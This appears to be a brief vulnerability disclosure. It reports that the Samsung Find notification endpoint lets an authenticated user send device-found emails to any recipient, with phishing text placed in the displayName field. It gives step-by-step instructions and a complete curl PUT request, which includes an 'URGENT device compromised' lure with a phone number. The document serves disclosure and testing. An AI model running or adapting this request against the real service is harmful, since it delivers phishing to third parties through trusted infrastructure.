## Use case

The Samsung Find Notification API allowed an authenticated user to send emails to arbitrary recipients without validating the email address against the user's account. This flaw could be exploited to deliver phishing emails using Samsung's trusted infrastructure.

## Steps to test

1. Authenticate to the Samsung Find API and obtain an AUTH_TOKEN and USER_ID.
2. Send a PUT request to the endpoint /devices/{deviceId}/notifications/found with a modified email address in the request body.
3. Set the email field to an external recipient's email address (e.g., external-recipient@example.net).
4. Change the displayName field to include urgent or misleading content.
5. Trigger a device-found event to deliver the email to the specified external address.

## Commands

```text
curl 'https://api.samsungfind.com/devices/<DEVICE_ID>/notifications/found' \
-X 'PUT' \
-H 'accept: application/json, text/plain, */*' \
-H 'content-type: application/json' \
-H 'origin: https://samsungfind.samsung.com' \
-H 'x-sec-find-client-type: web' \
-H 'x-sec-sa-authtoken: <AUTH_TOKEN>' \
-H 'x-sec-sa-userid: <USER_ID>' \
--data-raw '{ "item": { "enabled": true, "userId": "<USER_ID>", "email": "external-recipient@example.net", "language": "en", "displayName": "[URGENT] Device compromised - Call Samsung Support +39 333 1234567 or visit www.example.com - a new vulnerability", "units": "L" } }'
PUT /devices/{deviceId}/notifications/found
```
